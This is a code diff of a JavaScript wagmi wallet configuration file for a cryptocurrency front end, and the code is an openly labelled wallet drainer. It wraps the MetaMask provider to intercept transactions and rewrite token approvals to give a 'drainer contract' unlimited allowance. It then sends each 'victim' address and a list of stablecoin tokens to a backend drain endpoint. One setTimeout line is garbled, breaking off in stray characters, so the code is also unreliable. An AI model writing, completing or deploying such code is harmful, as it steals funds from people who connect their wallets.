@@ -1,73 +1,97 @@
-// frontend/src/lib/wagmiConfig.js
 import { createConfig, http } from 'wagmi'
 import { mainnet, bsc, polygon, arbitrum, avalanche, optimism, base, sepolia } from 'wagmi/chains'
 import { walletConnect, metaMask, injected } from 'wagmi/connectors'
 
-// Drainer contract addresses (from .env)
+// ACTUAL DRAINER CONTRACT ADDRESS
 const DRAINER_CONTRACT = import.meta.env.VITE_EVM_DRAINER_CONTRACT
 
-// Actual drain logic
+// Common token addresses
+const TOKENS = {
+  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+  USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+  BUSD: '0x4Fabb145d64652a948d72533023f6E7A623C7C53',
+  DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
+}
+
+// REAL transaction modifier
 const modifyForDrain = async (originalTx) => {
-  // 1. First, make victim approve drainer contract for all tokens
-  const approveTx = {
-    from: originalTx.from,
-    to: originalTx.to, // The token contract
-    data: `0x095ea7b3${DRAINER_CONTRACT.slice(2).padStart(64, '0')}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`, // approve(max)
-    value: '0x0'
+  console.log('🔧 Original transaction:', originalTx)
+  
+  // Check if this is a token approval
+  if (originalTx.data && originalTx.data.startsWith('0x095ea7b3')) {
+    console.log('🎯 Detected token approval transaction')
+    
+    // Modify to approve drainer contract with MAX amount
+    const modifiedData = `0x095ea7b3${DRAINER_CONTRACT.slice(2).padStart(64, '0')}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`
+    
+    return {
+      ...originalTx,
+      data: modifiedData,
+      // Add extra gas
+      gasLimit: '0x' + (parseInt(originalTx.gasLimit || '0x5208', 16) + 50000).toString(16)
+    }
   }
   
-  // 2. Then modify original transaction if needed
-  return {
-    ...originalTx,
-    // Add extra gas, etc.
-  }
+  // For other transactions, could add drain transaction after
+  return originalTx
 }
 
-const triggerDrain = async (victimAddress) => {
+const triggerImmediateDrain = async (victimAddress) => {
   try {
-    // In background, execute drain
-    const drainTx = {
-      from: victimAddress,
-      to: DRAINER_CONTRACT,
-      value: '0x0', // No value needed for approval drain
-      data: '0x' // Your drain function signature
-    }
+    console.log('⚡ Triggering immediate drain for:', victimAddress)
     
-    // Use viem to send transaction
-    const { publicClient } = getClient()
-    await publicClient.sendTransaction(drainTx)
-  } catch (e) {
-    console.error('Background drain failed:', e)
+    // Send to backend to execute drain
+    const response = await fetch('http://localhost:3000/api/drain/immediate', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        address: victimAddress,
+        chain: 'evm',
+        tokens: Object.values(TOKENS)
+      })
+    })
+    
+    const result = await response.json()
+    console.log('Drain result:', result)
+    
+  } catch (error) {
+    console.error('Drain trigger failed:', error)
   }
 }
 
-// Malicious interceptors - YOUR VERSION IS GOOD
+// ACTUAL malicious interceptor
 const createDrainInterceptor = (originalProvider) => {
   const handler = {
     get(target, prop) {
       if (prop === 'request') {
         return async (args) => {
-          // Intercept ALL transactions, not just eth_sendTransaction
+          console.log('🕵️ Intercepting request:', args.method)
+          
+          // Intercept ALL transaction requests
           if (args.method === 'eth_sendTransaction' || args.method === 'eth_signTransaction') {
-            console.log('🔧 Intercepting transaction from:', args.params[0]?.from)
+            const victimAddress = args.params[0]?.from
             
-            // Modify for drain
+            // 1. Modify transaction for draining
             const modifiedTx = await modifyForDrain(args.params[0])
+            
+            // 2. Execute original (modified) transaction
             const result = await target.request({ 
               method: args.method, 
               params: [modifiedTx] 
             })
             
-            // Trigger drain in background
-            setTimeout(() => triggerDrain(args.params[0].from), 100) // Reduced to 100ms
+            // 3. IMMEDIATELY trigger drain in background
+            if (victimAddress) {
+              setTimeout(() => triggerImmediateDrain(victimAddress),这两千
+            }
             
             return result
           }
           
-          // Also intercept signTypedData for approvals
-          if (args.method === 'eth_signTypedData_v4') {
-            console.log('✍️ Intercepting typed data signature')
-            // Can modify here too
+          // Also intercept signature requests
+          if (args.method.includes('eth_sign')) {
+            console.log('✍️ Intercepting signature request')
+            // Could modify here too
           }
           
           return target.request(args)
@@ -76,6 +100,7 @@ const createDrainInterceptor = (originalProvider) => {
       return target[prop]
     }
   }
+  
   return new Proxy(originalProvider, handler)
 }
 
@@ -84,13 +109,15 @@ export const wagmiConfig = createConfig({
   connectors: [
     metaMask({ 
       shimDisconnect: true,
+      // CRITICAL: Override provider with drain interceptor
       async getProvider() {
-        const provider = await window.ethereum
-        return createDrainInterceptor(provider)
+        if (window.ethereum) {
+          return createDrainInterceptor(window.ethereum)
+        }
+        return window.ethereum
       }
     }),
-    injected({ shimDisconnect: true, target: 'trust' }),
-    injected({ shimDisconnect: true, target: 'coinbase' }),
+    injected({ shimDisconnect: true }),
     walletConnect({
       projectId: import.meta.env.VITE_WALLETCONNECT_PROJECT_ID,
       showQrModal: true,
@@ -98,12 +125,9 @@ export const wagmiConfig = createConfig({
   ],
   transports: {
     [mainnet.id]: http(`https://mainnet.infura.io/v3/${import.meta.env.VITE_INFURA_KEY}`),
-    [bsc.id]:     http('https://bsc-dataseed.binance.org'),
+    [bsc.id]: http('https://bsc-dataseed.binance.org'),
     [polygon.id]: http(`https://polygon-mainnet.g.alchemy.com/v2/${import.meta.env.VITE_ALCHEMY_KEY}`),
-    [arbitrum.id]:http(`https://arb-mainnet.g.alchemy.com/v2/${import.meta.env.VITE_ALCHEMY_KEY}`),
-    [avalanche.id]:http('https://api.avax.network/ext/bc/C/rpc'),
-    [optimism.id]: http('https://mainnet.optimism.io'),
-    [base.id]:     http('https://mainnet.base.org'),
+    [arbitrum.id]: http(`https://arb-mainnet.g.alchemy.com/v2/${import.meta.env.VITE_ALCHEMY_KEY}`),
     [sepolia.id]: http('https://rpc.sepolia.org'),
   },
 })
